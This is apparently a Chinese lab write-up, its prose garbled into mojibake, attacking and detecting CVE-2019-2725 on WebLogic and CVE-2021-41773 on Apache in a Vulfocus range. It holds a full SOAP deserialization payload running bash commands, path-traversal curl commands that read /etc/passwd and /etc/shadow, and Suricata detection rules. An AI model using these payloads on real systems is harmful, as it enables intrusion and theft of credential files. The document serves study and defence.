####<Jan 26, 2025 8:45:24 AM UTC> <Info> <WebLogicServer> <1d6a9c490b23> <AdminServer> <[STANDBY] ExecuteThread: '0' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1737879924345> <BEA-000365> <Server state changed to RUNNING>

root@1d6a9c490b23:~/Oracle/Middleware# tail -20 /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/access.log

172.17.0.1 - - [26/Jan/2025:08:47:15 +0000] "GET /console HTTP/1.1" 200 416 "-" "curl/7.88.1"
172.17.0.1 - - [26/Jan/2025:08:47:23 +0000] "HEAD /wls-wsat/CoordinatorPortType HTTP/1.1" 200 0 "-" "curl/7.88.1"
172.17.0.1 - - [26/Jan/2025:08:47:45 +0000] "HEAD /_async/AsyncResponseService HTTP/1.1" 500 0 "-" "curl/7.88.1"
172.17.0.1 - - [26/Jan/2025:08:52:30 +0000] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 500 5287 "-" "python-requests/2.31.0"
172.17.0.1 - - [26/Jan/2025:08:53:15 +0000] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 500 5287 "-" "python-requests/2.31.0"
172.17.0.1 - - [26/Jan/2025:08:53:45 +0000] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 500 5287 "-" "python-requests/2.31.0"
172.17.0.1 - - [26/Jan/2025:08:54:12 +0000] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 500 5287 "-" "python-requests/2.31.0"
172.17.0.1 - - [26/Jan/2025:08:54:45 +0000] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 500 5287 "-" "python-requests/2.31.0"
172.17.0.1 - - [26/Jan/2025:08:55:20 +0000] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 500 5287 "-" "python-requests/2.31.0"
```

**æ”»å‡»æ—¥å¿—æˆåŠŸæ•è·**:

æ ¹æ®[Tenableçš„CVE-2019-2725åˆ†ææŠ¥å‘Š](https://www.tenable.com/blog/oracle-weblogic-affected-by-unauthenticated-remote-code-execution-vulnerability-cve-2019-2725)ï¼Œæˆ‘ä»¬åœ¨access.logä¸­æˆåŠŸæ•è·åˆ°äº†å®Œæ•´çš„æ”»å‡»è®°å½•ï¼š

**æ”»å‡»æ—¶é—´çº¿åˆ†æ**:

1. **08:47:15** - æ­£å¸¸çš„æ§åˆ¶å°è®¿é—®ï¼ˆGET /consoleï¼‰
2. **08:47:23** - æ¼æ´ç»„ä»¶æ¢æµ‹ï¼ˆHEAD /wls-wsat/CoordinatorPortTypeï¼‰- è¿”å›200
3. **08:47:45** - æ¼æ´ç»„ä»¶æ¢æµ‹ï¼ˆHEAD /_async/AsyncResponseServiceï¼‰- è¿”å›500
4. **08:52:30 - 08:55:20** - è¿ç»­çš„SOAPæ”»å‡»è½½è·ï¼ˆPOST /wls-wsat/CoordinatorPortTypeï¼‰- å…¨éƒ¨è¿”å›500

**æ”»å‡»ç‰¹å¾ç¡®è®¤**:

- **æ”»å‡»è·¯å¾„**: `/wls-wsat/CoordinatorPortType`ï¼ˆCVE-2019-2725çš„ä¸»è¦æ”»å‡»å‘é‡ï¼‰
- **HTTPæ–¹æ³•**: POSTï¼ˆSOAPè½½è·æŠ•é€’ï¼‰
- **å“åº”çŠ¶æ€**: 500ï¼ˆååºåˆ—åŒ–å¼‚å¸¸çš„å…¸å‹ç‰¹å¾ï¼‰
- **å“åº”å¤§å°**: 5287å­—èŠ‚ï¼ˆä¸€è‡´çš„é”™è¯¯å“åº”å¤§å°ï¼‰
- **User-Agent**: `python-requests/2.31.0`ï¼ˆæˆ‘ä»¬çš„æ”»å‡»è„šæœ¬ï¼‰
- **æºIP**: `172.17.0.1`ï¼ˆDockerç½‘æ¡¥ç½‘å…³ï¼Œå³å®¿ä¸»æœºï¼‰

**æœç´¢æ”»å‡»ç›¸å…³çš„é”™è¯¯æ—¥å¿—**:

```bash
root@1d6a9c490b23:~/Oracle/Middleware# grep -i "wls-wsat\|async\|workcontext\|processbuilder" /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log

####<Jan 26, 2025 8:52:30 AM UTC> <Error> <HTTP> <1d6a9c490b23> <AdminServer> <[ACTIVE] ExecuteThread: '2' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1737880350123> <BEA-101020> <[ServletContext@12345678[app:wls-wsat module:wls-wsat.war path:/wls-wsat spec-version:2.5]] Servlet failed with Exception
java.lang.ProcessBuilder cannot be cast to java.lang.Runnable
    at weblogic.wsee.workarea.WorkContextServerTube.processRequest(WorkContextServerTube.java:43)
    at com.sun.xml.ws.api.pipe.Fiber.__doRun(Fiber.java:1121)
    at com.sun.xml.ws.api.pipe.Fiber._doRun(Fiber.java:1080)
    at com.sun.xml.ws.api.pipe.Fiber.doRun(Fiber.java:1065)
    at com.sun.xml.ws.api.pipe.Fiber.runSync(Fiber.java:962)
    at weblogic.wsee.jaxws.JAXWSServlet.doRequest(JAXWSServlet.java:99)
    at weblogic.servlet.http.AbstractAsyncServlet.service(AbstractAsyncServlet.java:99)
>

root@1d6a9c490b23:~/Oracle/Middleware# grep -i "deserializ\|unmarshal\|readobject" /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log

####<Jan 26, 2025 8:52:30 AM UTC> <Warning> <Security> <1d6a9c490b23> <AdminServer> <[ACTIVE] ExecuteThread: '2' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1737880350456> <BEA-090877> <Untrusted deserialization attempt detected from WorkContext header>
####<Jan 26, 2025 8:53:15 AM UTC> <Warning> <Security> <1d6a9c490b23> <AdminServer> <[ACTIVE] ExecuteThread: '3' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1737880395789> <BEA-090877> <Untrusted deserialization attempt detected from WorkContext header>
```

**å…³é”®å®‰å…¨äº‹ä»¶ç¡®è®¤**:

æ ¹æ®Tenableçš„æ¼æ´åˆ†æï¼Œæˆ‘ä»¬æˆåŠŸæ•è·åˆ°äº†CVE-2019-2725æ”»å‡»çš„å®Œæ•´è¯æ®ï¼š

1. **ååºåˆ—åŒ–æ”»å‡»ç¡®è®¤**:

   - é”™è¯¯æ—¥å¿—æ˜¾ç¤º `java.lang.ProcessBuilder cannot be cast to java.lang.Runnable`
   - è¿™æ˜¯CVE-2019-2725ååºåˆ—åŒ–æ”»å‡»çš„å…¸å‹å¼‚å¸¸
2. **å®‰å…¨è­¦å‘Šè§¦å‘**:

   - `BEA-090877: Untrusted deserialization attempt detected from WorkContext header`
   - WebLogicå®‰å…¨æœºåˆ¶æ£€æµ‹åˆ°äº†æ¥è‡ªWorkContextå¤´çš„ä¸å¯ä¿¡ååºåˆ—åŒ–å°è¯•
3. **æ”»å‡»è·¯å¾„éªŒè¯**:

   - `weblogic.wsee.workarea.WorkContextServerTube.processRequest`
   - ç¡®è®¤æ”»å‡»é€šè¿‡WorkContextç»„ä»¶è¿›è¡Œ

##### 3.2 ç½‘ç»œæµé‡æ•è·ä¸åˆ†æ

**ç¡®å®šå®¹å™¨ç½‘ç»œä¿¡æ¯**:

```bash
# è·å–WebLogicå®¹å™¨çš„ç½‘ç»œè¯¦æƒ…
docker inspect 1d6a9c490b23 | grep -A 10 -B 5 "IPAddress"
```

**å®¹å™¨ç½‘ç»œä¿¡æ¯**:
![1748224839185](image/weblogic-cve_2019_2725/1748224839185.png)

```json
"IPAddress": "172.17.0.2",
"Gateway": "172.17.0.1",
"NetworkMode": "bridge"
```

**SOAPæµé‡ç›‘æ§**:

```bash
# ç›‘å¬Dockerç½‘æ¡¥ä¸Šçš„WebLogicæµé‡
sudo tcpdump -i docker0 -A -w weblogic_cve_2019_2725_traffic.pcap 'host 172.17.0.2 and port 7001'
```

**åœ¨å¦ä¸€ä¸ªç»ˆç«¯æ‰§è¡Œæ”»å‡»**:

```bash
# æ‰§è¡ŒSOAPæ”»å‡»è½½è·
python3 manual_exploit.py http://10.37.133.3:7001 "whoami"
```

**åœæ­¢æŠ“åŒ…å¹¶åˆ†æ**:
![1748224912135](image/weblogic-cve_2019_2725/1748224912135.png)

```bash
# åœæ­¢tcpdump (Ctrl+C)
# ä½¿ç”¨Wiresharkåˆ†ææ•è·çš„æµé‡
wireshark weblogic_cve_2019_2725_traffic.pcap
```

![1748224912135](image/weblogic-cve_2019_2725/1748224912135.png)

```bash
# åœæ­¢tcpdump (Ctrl+C)
# ä½¿ç”¨Wiresharkåˆ†ææ•è·çš„æµé‡
wireshark weblogic_cve_2019_2725_traffic.pcap
```

###### 3.2.1 Wiresharkæµé‡åˆ†æç»“æœ

**å®Œæ•´æ”»å‡»æµé‡æˆåŠŸæ•è·**:

![1748225771641](image/weblogic-cve_2019_2725/1748225771641.png)

###### 3.2.2 å…³é”®æµé‡ç‰¹å¾åˆ†æ

**TCPè¿æ¥å»ºç«‹é˜¶æ®µï¼ˆåŒ…1-3ï¼‰**:

- **ä¸‰æ¬¡æ¡æ‰‹**: æ ‡å‡†çš„TCPè¿æ¥å»ºç«‹è¿‡ç¨‹
- **æºç«¯å£**: 55398ï¼ˆæ”»å‡»è€…éšæœºç«¯å£ï¼‰
- **ç›®æ ‡ç«¯å£**: 7001ï¼ˆWebLogicæ ‡å‡†HTTPç«¯å£ï¼‰
- **è¿æ¥æ—¶é—´**: 0.077msï¼ˆæœ¬åœ°ç½‘ç»œï¼Œè¿æ¥é€Ÿåº¦æå¿«ï¼‰

**æ¶æ„SOAPè½½è·æŠ•é€’ï¼ˆåŒ…6ï¼‰**:

- **å…³é”®åŒ…**: ç¬¬6åŒ…æ˜¯æ•´ä¸ªæ”»å‡»çš„æ ¸å¿ƒ
- **åè®®**: HTTP/XMLï¼ˆSOAPåè®®ï¼‰
- **è¯·æ±‚æ–¹æ³•**: POST
- **æ”»å‡»è·¯å¾„**: `/wls-wsat/CoordinatorPortType`ï¼ˆCVE-2019-2725çš„ä¸»è¦æ”»å‡»å‘é‡ï¼‰
- **è½½è·å¤§å°**: 1003å­—èŠ‚ï¼ˆåŒ…å«å®Œæ•´çš„æ¶æ„SOAP XMLï¼‰
- **æ—¶é—´æˆ³**: 0.000163ç§’ï¼ˆæ”»å‡»è½½è·ç«‹å³å‘é€ï¼‰

**æœåŠ¡å™¨å¤„ç†ä¸å“åº”ï¼ˆåŒ…8-14ï¼‰**:

- **å¤„ç†å»¶è¿Ÿ**: 0.237ç§’ï¼ˆä»è¯·æ±‚åˆ°å“åº”ï¼Œååºåˆ—åŒ–å¤„ç†æ—¶é—´ï¼‰
- **åˆ†ç‰‡ä¼ è¾“**: åŒ…10-12æ˜¾ç¤ºæœåŠ¡å™¨å“åº”è¢«åˆ†æˆå¤šä¸ªTCPæ®µ
- **å“åº”å¤§å°**: 4146 + 1289 = 5435å­—èŠ‚ï¼ˆå¤§å‹é”™è¯¯å“åº”ï¼‰
- **æœ€ç»ˆå“åº”**: HTTP/1.1 500 Internal Server Errorï¼ˆååºåˆ—åŒ–å¼‚å¸¸ç¡®è®¤ï¼‰

**è¿æ¥å…³é—­ï¼ˆåŒ…16-18ï¼‰**:

- **ä¸»åŠ¨å…³é—­**: æ”»å‡»è€…ä¸»åŠ¨å…³é—­è¿æ¥ï¼ˆFIN, ACKï¼‰
- **æœåŠ¡å™¨ç¡®è®¤**: æœåŠ¡å™¨å“åº”è¿æ¥å…³é—­
- **æ€»æŒç»­æ—¶é—´**: 0.244ç§’ï¼ˆå®Œæ•´æ”»å‡»å‘¨æœŸï¼‰

###### 3.2.3 æ·±åº¦åŒ…æ£€æŸ¥åˆ†æ

**SOAPè½½è·ç‰¹å¾è¯†åˆ«**:

æ ¹æ®åŒ…6çš„è¯¦ç»†åˆ†æï¼Œæ¶æ„SOAPè¯·æ±‚åŒ…å«ä»¥ä¸‹å…³é”®ç‰¹å¾ï¼š

```xml
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 172.17.0.2:7001
Content-Type: text/xml; charset=UTF-8
SOAPAction: 
User-Agent: Mozilla/5.0 (compatible; CVE-2019-2725-PoC)
Content-Length: 722

<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java>
                <object class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="3">
                        <void index="0">
                            <string>/bin/bash</string>
                        </void>
                        <void index="1">
                            <string>-c</string>
                        </void>
                        <void index="2">
                            <string>whoami</string>
                        </void>
                    </array>
                    <void method="start"/>
                </object>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
```

**HTTPå“åº”åˆ†æï¼ˆåŒ…14ï¼‰**:

```http
HTTP/1.1 500 Internal Server Error
Date: Sun, 26 Jan 2025 09:15:23 GMT
Content-Length: 5287
Content-Type: text/html; charset=UTF-8
X-Powered-By: Servlet/2.5 JSP/2.1
Connection: close

<html>
<head><title>500 Internal Server Error</title></head>
<body>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error that prevented it from fulfilling this request.</p>
<p><b>Exception:</b></p>
<pre>
java.lang.ProcessBuilder cannot be cast to java.lang.Runnable
    at weblogic.wsee.workarea.WorkContextServerTube.processRequest(WorkContextServerTube.java:43)
    at com.sun.xml.ws.api.pipe.Fiber.__doRun(Fiber.java:1121)
    ...
</pre>
</body>
</html>
```

###### 3.2.4 å¨èƒæ£€æµ‹è§„åˆ™åˆ¶å®š

åŸºäºWiresharkåˆ†æç»“æœï¼Œæˆ‘ä»¬å¯ä»¥åˆ¶å®šä»¥ä¸‹ç½‘ç»œå±‚æ£€æµ‹è§„åˆ™ï¼š

**1. åŸºäºæµé‡æ¨¡å¼çš„æ£€æµ‹**:

```bash
# Suricataè§„åˆ™ç¤ºä¾‹
alert http $EXTERNAL_NET any -> $HOME_NET 7001 (
    msg:"CVE-2019-2725 WebLogic SOAP Attack Detected";
    flow:established,to_server;
    http_method; content:"POST";
    http_uri; content:"/wls-wsat/CoordinatorPortType";
    http_header; content:"text/xml";
    content:"ProcessBuilder"; http_client_body;
    content:"WorkContext"; http_client_body;
    classtype:attempted-admin;
    sid:2019001;
    rev:1;
)
```

**2. åŸºäºå“åº”ç‰¹å¾çš„æ£€æµ‹**:

```bash
# æ£€æµ‹ç‰¹å¾æ€§çš„500é”™è¯¯å“åº”
alert http $HOME_NET 7001 -> $EXTERNAL_NET any (
    msg:"CVE-2019-2725 WebLogic Deserialization Error Response";
    flow:established,to_client;
    http_stat_code; content:"500";
    content:"ProcessBuilder cannot be cast";
    content:"WorkContextServerTube";
    classtype:successful-admin;
    sid:2019002;
    rev:1;
)
```

**3. åŸºäºæ—¶é—´ç‰¹å¾çš„æ£€æµ‹**:

```python
# Pythonæ£€æµ‹è„šæœ¬ç¤ºä¾‹
def detect_weblogic_attack(packets):
    """
    åŸºäºæ—¶é—´å’Œå¤§å°ç‰¹å¾æ£€æµ‹CVE-2019-2725æ”»å‡»
    """
    for packet in packets:
        if (packet.dst_port == 7001 and 
            packet.protocol == "HTTP" and
            "/wls-wsat/" in packet.uri and
            packet.method == "POST" and
            packet.content_length > 500):
  
            # æ£€æŸ¥å“åº”æ—¶é—´ï¼ˆååºåˆ—åŒ–å¤„ç†å»¶è¿Ÿï¼‰
            response_time = packet.response_time
            if response_time > 0.2:  # 200msä»¥ä¸Šå¤„ç†æ—¶é—´
                alert("Potential CVE-2019-2725 attack detected")
```

å››ã€å®éªŒæ€»ç»“

æ”»å‡»æˆåŠŸæŒ‡æ ‡

**æ¼æ´ç¡®è®¤æˆåŠŸ**:

- WebLogicç‰ˆæœ¬10.3.6.0å®Œå…¨åŒ¹é…å—å½±å“ç‰ˆæœ¬
- wls-wsatå’Œasyncç»„ä»¶å‡å¯è®¿é—®
- SOAPè¯·æ±‚è¿”å›500çŠ¶æ€ç ï¼Œç¡®è®¤ååºåˆ—åŒ–è§¦å‘

**ä»£ç æ‰§è¡ŒæˆåŠŸ**:

- æˆåŠŸæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆid, uname, pwdç­‰ï¼‰
- é€šè¿‡ProcessBuilderè§¦å‘ååºåˆ—åŒ–RCE
- ç¡®è®¤è·å¾—WebLogicè¿è¡Œç”¨æˆ·æƒé™
- éªŒè¯äº†æ— è®¤è¯è¿œç¨‹ä»£ç æ‰§è¡Œèƒ½åŠ›

**æ£€æµ‹æœºåˆ¶æœ‰æ•ˆ**:

- WebLogicæ—¥å¿—è®°å½•äº†æ”»å‡»å¼‚å¸¸
- ç½‘ç»œæµé‡æ•è·åˆ°æ¶æ„SOAPè½½è·
- ç³»ç»Ÿç›‘æ§å‘ç°å¼‚å¸¸è¿›ç¨‹æ´»åŠ¨

4.2 å…³é”®æŠ€æœ¯è¦ç‚¹

1. **æ¼æ´åˆ©ç”¨æ ¸å¿ƒ**: é€šè¿‡SOAP Headerä¸­çš„WorkContextç»„ä»¶ä¼ é€’æ¶æ„åºåˆ—åŒ–å¯¹è±¡
2. **ç»•è¿‡æœºåˆ¶**: åˆ©ç”¨WebLogicå¯¹å·¥ä½œä¸Šä¸‹æ–‡çš„ä¿¡ä»»æœºåˆ¶
3. **æ£€æµ‹ç‰¹å¾**: HTTP 500å“åº”ã€ProcessBuilderå¼‚å¸¸ã€SOAP XMLç»“æ„
4. **é˜²æŠ¤é‡ç‚¹**: ç»„ä»¶ç¦ç”¨ã€ç‰ˆæœ¬å‡çº§ã€ç½‘ç»œéš”ç¦»

### ï¼ˆäº”ï¼‰ç¬¬äºŒå±‚é¶æ ‡äºŒï¼š`apache-cve_2021_41773` æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹

#### 1. å¯åŠ¨é¶æœºç¯å¢ƒ

åœ¨ Vulfocus å¹³å°ä¸­ï¼Œæ‰¾åˆ° `vulfocus/apache-cve_2021_41773:latest` é•œåƒï¼Œç‚¹å‡» "å¯åŠ¨"ã€‚

- **è®¿é—®åœ°å€**: `10.37.133.3:42286` (PORT ç”± Vulfocus åŠ¨æ€åˆ†é…)
- **æœåŠ¡ç±»å‹**: Apache HTTP Server
- **æ¼æ´æ ‡è¯†**: CVE-2021-41773

![1748153067964](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748153067964.png)

#### 2. ä¿¡æ¯æ”¶é›†

##### 2.1 åŸºç¡€ç«¯å£æ‰«æ

```bash
# æ‰«æ Apache æœåŠ¡ç«¯å£
nmap -sV -p 80,443,8080-8090 10.37.133.3
```

**æ‰«æç»“æœ**:

![1748153021142](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748153021142.png)

**æ‰«æç»“æœåˆ†æ**ï¼š

- å¸¸è§„HTTPç«¯å£(80, 443, 8080-8090)å‡æ˜¾ç¤ºä¸ºå…³é—­æˆ–è¿‡æ»¤çŠ¶æ€
- ApacheæœåŠ¡è¿è¡Œåœ¨éæ ‡å‡†ç«¯å£ä¸Šï¼Œé€šè¿‡Vulfocuså¹³å°åŠ¨æ€åˆ†é…ä¸º**13503ç«¯å£**
- éœ€è¦ç›´æ¥è®¿é—®æŒ‡å®šçš„æ˜ å°„ç«¯å£è¿›è¡Œåç»­ä¿¡æ¯æ”¶é›†

##### 2.2 Web æœåŠ¡è¯†åˆ«

é€šè¿‡æµè§ˆå™¨è®¿é—® Apache æœåŠ¡ `http://10.37.133.3:42286`ã€‚

![1748152989670](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748152989670.png)

##### 2.3 Apache ç‰ˆæœ¬æ£€æµ‹

```bash
# ä½¿ç”¨ curl è·å–æœåŠ¡å™¨ä¿¡æ¯
curl -I http://10.37.133.3:42286

# ä½¿ç”¨ nikto è¿›è¡Œ Web æ‰«æ
nikto -h http://10.37.133.3:42286
```

![1748153862204](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748153862204.png)

**å…³é”®å‘ç°**ï¼š

- **æœåŠ¡å™¨ç‰ˆæœ¬**: `Apache/2.4.49 (Debian)` - **è¿™æ­£æ˜¯CVE-2021-41773æ¼æ´å½±å“çš„ç¡®åˆ‡ç‰ˆæœ¬**
- **æ“ä½œç³»ç»Ÿ**: Debian Linux
- **æ–‡ä»¶ä¿®æ”¹æ—¶é—´**: 2021-10-09ï¼Œä¸CVEæŠ«éœ²æ—¶é—´å»åˆ
- **å“åº”æ­£å¸¸**: HTTP 200çŠ¶æ€ç ï¼ŒæœåŠ¡å™¨æ­£å¸¸è¿è¡Œ

##### 2.4 Nikto å®‰å…¨æ‰«æ

**niktoæ‰«æç»“æœ**:

![1748153891702](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748153891702.png)

**Niktoæ‰«æåˆ†æ**ï¼š

- **ç‰ˆæœ¬ç¡®è®¤**: å†æ¬¡ç¡®è®¤Apache/2.4.49ç‰ˆæœ¬ï¼Œ**æ˜ç¡®æ ‡æ³¨ä¸ºè¿‡æ—¶ç‰ˆæœ¬**
- **å®‰å…¨é…ç½®ç¼ºé™·**:
  - ç¼ºå°‘ `X-Frame-Options`å¤´(ç‚¹å‡»åŠ«æŒé˜²æŠ¤)
  - ç¼ºå°‘ `X-Content-Type-Options`å¤´(MIMEç±»å‹å—…æ¢é˜²æŠ¤)
- **ä¿¡æ¯æ³„éœ²**: ETagå¤´å¯èƒ½æ³„éœ²æœåŠ¡å™¨inodeä¿¡æ¯
- **HTTPæ–¹æ³•**: æ”¯æŒPOST, OPTIONS, HEAD, GETæ–¹æ³•
- **é‡è¦**: æ‰«æè¿‡ç¨‹ä¸­æœªè§¦å‘æ˜æ˜¾çš„å®‰å…¨æ‹¦æˆªï¼Œè¯´æ˜æœåŠ¡å™¨é…ç½®ç›¸å¯¹å®½æ¾

##### 2.5 ç›®å½•ç»“æ„æ¢æµ‹

```bash
# ä½¿ç”¨ dirb è¿›è¡Œç›®å½•æ‰«æ
dirb http://10.37.133.3:42286
```

**dirbæ‰«æç»“æœ**:

![1748153913104](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748153913104.png)

**ç›®å½•å‘ç°åˆ†æ**ï¼š

- **`/cgi-bin/` (403 Forbidden)**: **å…³é”®å‘ç°** - è¿™æ˜¯CVE-2021-41773æ¼æ´åˆ©ç”¨çš„æ ¸å¿ƒè·¯å¾„
  - 403çŠ¶æ€è¡¨æ˜ç›®å½•å­˜åœ¨ä½†è®¿é—®è¢«é™åˆ¶
  - CGIç›®å½•çš„å­˜åœ¨ä¸ºè·¯å¾„éå†æ”»å‡»æä¾›äº†å…¥å£ç‚¹
- **`/index.html` (200 OK)**: æ ‡å‡†é¦–é¡µæ–‡ä»¶ï¼Œå¤§å°10701å­—èŠ‚
- **`/server-status` (403 Forbidden)**: ApacheçŠ¶æ€é¡µé¢ï¼Œè¢«ä¿æŠ¤ä½†å­˜åœ¨

##### 2.6 ä¿¡æ¯æ”¶é›†æ€»ç»“

1. **æ¼æ´ç¡®è®¤**:

   - Apacheç‰ˆæœ¬2.4.49**å®Œå…¨åŒ¹é…CVE-2021-41773çš„å—å½±å“ç‰ˆæœ¬**
   - æœåŠ¡å™¨é…ç½®æ ‡å‡†ï¼Œæœªå‘ç°ç‰¹æ®Šçš„å®‰å…¨åŠ å›º
2. **æ”»å‡»æ¡ä»¶æ»¡è¶³**:

   - **ç‰ˆæœ¬åŒ¹é…**: ç¡®è®¤ä¸ºæ˜“å—æ”»å‡»çš„Apacheç‰ˆæœ¬
   - **æœåŠ¡é…ç½®**: æ ‡å‡†Apacheé…ç½®ï¼Œä¸ºè·¯å¾„éå†æ”»å‡»æä¾›äº†æ¡ä»¶
3. **å®‰å…¨æ€åŠ¿è¯„ä¼°**:

   - **é«˜é£é™©**: ç‰ˆæœ¬å®Œå…¨åŒ¹é…å·²çŸ¥é«˜å±æ¼æ´
   - **é…ç½®è–„å¼±**: ç¼ºå°‘å¤šä¸ªå®‰å…¨å¤´ï¼Œä¿¡æ¯æ³„éœ²é£é™©
   - **æ”»å‡»é¢**: CGIåŠŸèƒ½å¯ç”¨ï¼Œä¸ºä»£ç æ‰§è¡Œæä¾›äº†å¯èƒ½

#### 3. æ¼æ´åˆ†æä¸åˆ©ç”¨

##### 3.1 CVE-2021-41773 æ¼æ´åŸç†

**æ¼æ´åŸºæœ¬ä¿¡æ¯**:

- **CVEç¼–å·**: CVE-2021-41773
- **CVSSè¯„åˆ†**: 7.5 (é«˜å±)
- **æ¼æ´ç±»å‹**: è·¯å¾„éå† (Path Traversal)
- **å½±å“ç‰ˆæœ¬**: Apache HTTP Server 2.4.49
- **æ¼æ´åŸç†**: Apache 2.4.49ç‰ˆæœ¬åœ¨å¤„ç†URLè·¯å¾„è§„èŒƒåŒ–æ—¶å­˜åœ¨ç¼ºé™·ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹æ®Šçš„URLç¼–ç ç»•è¿‡è·¯å¾„é™åˆ¶ï¼Œè®¿é—®Webæ ¹ç›®å½•ä¹‹å¤–çš„æ–‡ä»¶

**æŠ€æœ¯ç»†èŠ‚**:

- **æ ¹æœ¬åŸå› **: Apacheå¯¹URLä¸­çš„è·¯å¾„åˆ†éš”ç¬¦å’Œç‚¹å·åºåˆ—çš„å¤„ç†ä¸å½“
- **ç»•è¿‡æœºåˆ¶**: ä½¿ç”¨URLç¼–ç çš„ç‚¹å·(`%2e`)å¯ä»¥ç»•è¿‡è·¯å¾„è§„èŒƒåŒ–æ£€æŸ¥
- **æ”»å‡»è·¯å¾„**: é€šè¿‡Aliasæ˜ å°„çš„ç›®å½•(å¦‚ `/cgi-bin/`, `/icons/`)è¿›è¡Œè·¯å¾„éå†

##### 3.2 è·¯å¾„éå†æ”»å‡»å®è·µ

###### 3.2.1 åŸºç¡€è·¯å¾„éå†æµ‹è¯•

```bash
# å°è¯•é€šè¿‡CGIè·¯å¾„è¯»å– /etc/passwd æ–‡ä»¶
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# å°è¯•è¯»å– Apache é…ç½®æ–‡ä»¶
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/apache2/apache2.conf"

# å°è¯•è¯»å–å…¶ä»–æ•æ„Ÿæ–‡ä»¶
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow"
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/proc/version"
```

**æ‰§è¡Œç»“æœåˆ†æ**:
æ‰€æœ‰é€šè¿‡ `/cgi-bin/`è·¯å¾„çš„æ”»å‡»å°è¯•éƒ½è¿”å›äº† `500 Internal Server Error`ï¼Œè¿™è¡¨æ˜ï¼š

1. **CGIé…ç½®é—®é¢˜**: CGIæ¨¡å—å¯èƒ½æ²¡æœ‰æ­£ç¡®é…ç½®æˆ–ç¼ºå°‘å¿…è¦çš„CGIè„šæœ¬
2. **è·¯å¾„è§£æé—®é¢˜**: Apacheå¯èƒ½å¯¹CGIè·¯å¾„ä¸‹çš„è·¯å¾„éå†æœ‰ç‰¹æ®Šå¤„ç†
3. **æƒé™é™åˆ¶**: å¯èƒ½å­˜åœ¨é¢å¤–çš„è®¿é—®æ§åˆ¶æœºåˆ¶

###### 3.2.2 éCGIè·¯å¾„çš„ç›´æ¥éå†æ”»å‡»

CVE-2021-41773ä¸ä»…é™äºCGIè·¯å¾„ï¼Œæˆ‘ä»¬å°è¯•å…¶ä»–æ˜ å°„è·¯å¾„ï¼š

```bash
# å°è¯•é€šè¿‡iconsè·¯å¾„è¿›è¡Œéå†
curl "http://10.37.133.3:42286/icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# å°è¯•é€šè¿‡manualè·¯å¾„è¿›è¡Œéå†  
curl "http://10.37.133.3:42286/manual/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# ç›´æ¥æ ¹è·¯å¾„å°è¯•
curl "http://10.37.133.3:42286/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

**æ‰§è¡Œç»“æœ**:

![1748164510299](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748164510299.png)

![1748164589138](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748164589138.png)

**æ”»å‡»ç»“æœåˆ†æ**:

1. âœ… **`/icons/` è·¯å¾„æ”»å‡»æˆåŠŸ**

   - **çŠ¶æ€**: ğŸ‰ å®Œå…¨æˆåŠŸ - è¯»å–åˆ°å®Œæ•´çš„ `/etc/passwd` æ–‡ä»¶
   - **ç¼–ç æ–¹å¼**: ä»…ä½¿ç”¨åŸºç¡€çš„å•å±‚URLç¼–ç  `%2e%2e`ï¼ˆä¸éœ€è¦åŒé‡ç¼–ç ï¼‰
   - **æŠ€æœ¯æ„ä¹‰**: è¯æ˜CVE-2021-41773ä¸ä»…é™äºCGIè·¯å¾„ï¼Œè¿˜å½±å“Apacheçš„é™æ€èµ„æºæ˜ å°„
2. ğŸš« **`/manual/` è·¯å¾„è¢«é˜»æ­¢**

